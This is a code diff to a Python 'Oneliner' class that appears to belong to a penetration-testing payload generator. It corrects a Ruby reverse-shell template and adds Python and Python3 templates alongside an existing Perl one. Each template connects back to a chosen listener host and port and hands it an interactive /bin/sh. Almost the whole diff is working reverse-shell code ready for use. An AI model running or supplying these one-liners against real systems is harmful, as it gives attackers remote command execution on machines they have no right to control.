@@ -101,7 +101,13 @@ class Oneliner:
 			payload = f"""perl -e 'use Socket;$i={self.args.lhost};$p={self.args.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){perl_obj};'"""
 
 		if self.shell == "ruby":
-			payload = f"""ruby -rsocket -e'f=TCPSocket.open({args.lhost},{args.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
+			payload = f"""ruby -rsocket -e'f=TCPSocket.open({self.args.lhost},{self.args.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
+
+		if self.shell == "python":
+			payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.args.lhost}",{self.args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
+
+		if self.shell == "python3":
+			payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.args.lhost}",{self.args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
 
 		if self.args.encode:
 			self.payload = payload
